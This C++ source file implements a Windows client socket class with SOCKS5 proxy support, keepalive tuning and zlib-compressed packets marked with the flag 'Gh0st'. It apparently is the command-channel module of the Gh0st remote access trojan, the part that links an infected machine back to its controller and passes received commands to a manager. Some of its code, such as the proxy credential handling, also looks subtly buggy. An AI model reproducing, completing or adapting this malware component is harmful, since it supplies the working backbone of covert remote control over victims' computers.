// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "ClientSocket.h"
#include "zlib/zlib.h"
#include <process.h>
#include <MSTcpIP.h>
#include "Manager.h"
#include "until.h"
#pragma comment(lib, "ws2_32.lib")

int CClientSocket::m_nProxyType = PROXY_NONE;
UINT CClientSocket::m_nProxyPort = 1080;
char CClientSocket::m_strProxyHost[256] = {0};
char CClientSocket::m_strUserName[256] = {0};
char CClientSocket::m_strPassWord[256] = {0};

BYTE CClientSocket::m_byPacketFlag[FLAG_SIZE] = {'G','h','0','s','t'};

CClientSocket::CClientSocket()
{
	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);

	m_bIsRunning = false;

	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_Socket = INVALID_SOCKET;

	m_hRecvWorkerThread = NULL;

	/*BYTE byPacketFlag[] = {'G', 'h', '0', 's', 't'};
	memcpy(m_byPacketFlag, byPacketFlag, sizeof(byPacketFlag));*/
}

CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hRecvWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hRecvWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}

bool CClientSocket::Connect(LPCSTR lpszHost, UINT nPort)
{
	Disconnect();

	ResetEvent(m_hEvent);

	m_bIsRunning = false;

	if (m_nProxyType != PROXY_NONE
		&& m_nProxyType != PROXY_SOCKS_VER4 
		&& m_nProxyType != PROXY_SOCKS_VER5)
	{
		return false;
	}

	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	if (m_Socket == SOCKET_ERROR)   
	{
		return false;   
	}

	hostent* pHostent = NULL;
	if (m_nProxyType != PROXY_NONE)
	{
		pHostent = gethostbyname(m_strProxyHost);
	}
	else
	{
		pHostent = gethostbyname(lpszHost);
	}

	if (!pHostent)
	{
		return false;
	}
	
	sockaddr_in	cliAddr;
	cliAddr.sin_family	= AF_INET;
	cliAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	if (PROXY_NONE != m_nProxyType)
	{
		cliAddr.sin_port = htons(m_nProxyPort);
	}
	else
	{
		cliAddr.sin_port = htons(nPort);
	}

	if (SOCKET_ERROR == connect(m_Socket, (SOCKADDR *)&cliAddr, sizeof(cliAddr)))
	{	
		return false;
	}

// 禁用Nagle算法后，对程序效率有严重影响,小包的话，会压缩后等到一定的字节数再传输，对高交互的程序不适合。暂时先不禁止
//  const char chOpt = 1;
// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));

	if (m_nProxyType == PROXY_SOCKS_VER5 && !ConnectProxyServer(lpszHost, nPort))
	{
		return false;
	}

	char chOpt = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		tcp_keepalive klive;
		klive.onoff = 1;
		klive.keepalivetime = 1000 * 60 * 3;
		klive.keepaliveinterval = 1000 * 5;

		WSAIoctl(m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL);
	}

	m_bIsRunning = true;
	m_hRecvWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);
	return true;
}



bool CClientSocket::ConnectProxyServer(LPCSTR lpszHost, UINT nPort)
{
		struct timeval tvSelect_Time_Out;
		tvSelect_Time_Out.tv_sec = 3;
		tvSelect_Time_Out.tv_usec = 0;
		fd_set fdRead;
		int	nRet = SOCKET_ERROR;

		char buff[600];
		struct socks5req1 m_proxyreq1;
		m_proxyreq1.Ver = PROXY_SOCKS_VER5;
		m_proxyreq1.nMethods = 2;
		m_proxyreq1.Methods[0] = 0;
		m_proxyreq1.Methods[1] = 2;
		send(m_Socket, (char *)&m_proxyreq1, sizeof(m_proxyreq1), 0);
		struct socks5ans1 *m_proxyans1;
		m_proxyans1 = (struct socks5ans1 *)buff;
		memset(buff, 0, sizeof(buff));

		
		FD_ZERO(&fdRead);
		FD_SET(m_Socket, &fdRead);
		nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);
		
		if (nRet <= 0)
		{
			closesocket(m_Socket);
			return false;
		}
		recv(m_Socket, buff, sizeof(buff), 0);
		if(m_proxyans1->Ver != 5 || (m_proxyans1->Method !=0 && m_proxyans1->Method != 2))
		{
			closesocket(m_Socket);
			return false;
		}
		
		
		if(m_proxyans1->Method == 2 && strlen(m_strUserName) > 0)
		{
			int nUserLen = strlen(m_strUserName);
			int nPassLen = strlen(m_strPassWord);
			struct authreq m_authreq;
			memset(&m_authreq, 0, sizeof(m_authreq));
			m_authreq.Ver = PROXY_SOCKS_VER5;
			m_authreq.Ulen = nUserLen;
			strcpy(m_authreq.NamePass, m_strUserName);
			memcpy(m_authreq.NamePass + nUserLen, &nPassLen, sizeof(int));
			strcpy(m_authreq.NamePass + nUserLen + 1, m_strPassWord);
			
			int len = 3 + nUserLen + nPassLen;
			
			send(m_Socket, (char *)&m_authreq, len, 0);
			
			struct authans *m_authans;
			m_authans = (struct authans *)buff;
			memset(buff, 0, sizeof(buff));

			FD_ZERO(&fdRead);
			FD_SET(m_Socket, &fdRead);
			nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);
			
			if (nRet <= 0)
			{
				closesocket(m_Socket);
				return false;
			}

			recv(m_Socket, buff, sizeof(buff), 0);
			if(m_authans->Ver != 5 || m_authans->Status != 0)
			{
				closesocket(m_Socket);
				return false;
			}
		}
		
		hostent* pHostent = gethostbyname(lpszHost);
		if (pHostent == NULL)
			return false;
		
		struct socks5req2 m_proxyreq2;
		m_proxyreq2.Ver = 5;
		m_proxyreq2.Cmd = 1;
		m_proxyreq2.Rsv = 0;
		m_proxyreq2.Atyp = 1;
		m_proxyreq2.IPAddr = * (ULONG*) pHostent->h_addr_list[0];
		m_proxyreq2.Port = ntohs(nPort);
		
		send(m_Socket, (char *)&m_proxyreq2, 10, 0);
		struct socks5ans2 *m_proxyans2;
		m_proxyans2 = (struct socks5ans2 *)buff;
		memset(buff, 0, sizeof(buff));

		FD_ZERO(&fdRead);
		FD_SET(m_Socket, &fdRead);
		nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);
		
		if (nRet <= 0)
		{
			closesocket(m_Socket);
			return false;
		}

		recv(m_Socket, buff, sizeof(buff), 0);
		if(m_proxyans2->Ver != 5 || m_proxyans2->Rep != 0)
		{
			closesocket(m_Socket);
			return false;
		}

		return true;
}
DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{
	CClientSocket *pThis = (CClientSocket *)lparam;

	char chRecvBuf[MAX_RECV_BUFFER];
	
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		
		if (nRet > 0)
		{
			memset(chRecvBuf, 0, sizeof(chRecvBuf));
			int nSize = recv(pThis->m_Socket, chRecvBuf, sizeof(chRecvBuf), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}

			pThis->OnRead((LPBYTE)chRecvBuf, nSize);
		}
	}

	return -1;
}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{
	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();
			return;
		}

		if (dwIoSize == FLAG_SIZE &&
			memcmp(lpBuffer, m_byPacketFlag, FLAG_SIZE) == 0)
		{
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}

		m_CompressionBuffer.Write(lpBuffer, dwIoSize);

		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE] = {0};
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			if (memcmp(m_byPacketFlag, bPacketFlag, sizeof(m_byPacketFlag)) != 0)
				throw "bad buffer";
			
			int nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
			
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{	
				m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
			
				int nUnCompressLength = 0;
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));

				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				memset(pData, 0, nCompressLength);

				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				memset(pDeCompressionData, 0, nUnCompressLength);
				
				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad Allocate";

				m_CompressionBuffer.Read(pData, nCompressLength);
				
				unsigned long ndestLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &ndestLen, pData, nCompressLength);
				if (nRet == Z_OK)
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, ndestLen);
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
				else
					throw "bad buffer";

				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}catch(...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
}

void CClientSocket::Disconnect()
{
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct));
	CancelIo((HANDLE) m_Socket);

	InterlockedExchange((LPLONG)&m_bIsRunning, false);

	closesocket(m_Socket);
	m_Socket = INVALID_SOCKET;
	
	SetEvent(m_hEvent);	
}

int CClientSocket::Send(LPBYTE lpData, UINT nSize)
{
	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long nDestLen = (double)nSize * 1.001  + 12;
		LPBYTE pDest = new BYTE[nDestLen];

		if (!pDest)
		{
			return 0;
		}

		int	nRet = compress(pDest, &nDestLen, lpData, nSize);
		
		if (Z_OK != nRet)
		{
			delete[] pDest;
			return -1;
		}
		
		LONG nBufLen = nDestLen + HDR_SIZE;
		
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_byPacketFlag, sizeof(m_byPacketFlag));
		
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
		
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		
		// Write Data
		m_WriteBuffer.Write(pDest, nDestLen);
		delete[] pDest;
		
		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);

		if (lpResendWriteBuffer)
		{
			delete[] lpResendWriteBuffer;
		}
	}
	else
	{
		m_WriteBuffer.Write(m_byPacketFlag, sizeof(m_byPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_byPacketFlag, sizeof(m_byPacketFlag));
	}

	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int nRet = 0;
	const char *pbuf = (char *)lpData;
	int size = 0;
	int	nSend = 0;
	int	nSendRetry = 15;

	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		int i = 0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);

			if (nRet > 0)
				break;
		}

		if (i == nSendRetry)
			return -1;
		
		nSend += nRet;
		pbuf += nSplitSize;

		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱,将来可以加序号，控制端自动组包，避免这个sleep
	}

	if (size > 0)
	{
		int i = 0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}

		if (i == nSendRetry)
		{
			return -1;
		}

		nSend += nRet;
	}

	if (nSend == nSize)
	{
		return nSend;
	}
	else
	{
		return SOCKET_ERROR;
	}
}

void CClientSocket::setManagerCallBack(CManager *pManager)
{
	m_pManager = pManager;
}

void CClientSocket::setGlobalProxyOption( int nProxyType /*= PROXY_NONE*/, LPCSTR lpszProxyHost /*= NULL*/, 
										 UINT nProxyPort /*= 1080*/, LPCSTR lpszUserName /*= NULL*/, LPCSTR lpszPassWord /*= NULL*/ )
{
	memset(m_strProxyHost, 0, sizeof(m_strProxyHost));
	memset(m_strUserName, 0, sizeof(m_strUserName));
	memset(m_strPassWord, 0, sizeof(m_strPassWord));

	m_nProxyType = nProxyType;
	if (lpszProxyHost != NULL)
		strcpy(m_strProxyHost, lpszProxyHost);

	m_nProxyPort = nProxyPort;
	if (m_strUserName != NULL)
		strcpy(m_strUserName, lpszUserName);
	if (m_strPassWord != NULL)
		strcpy(m_strPassWord, lpszPassWord);
}
	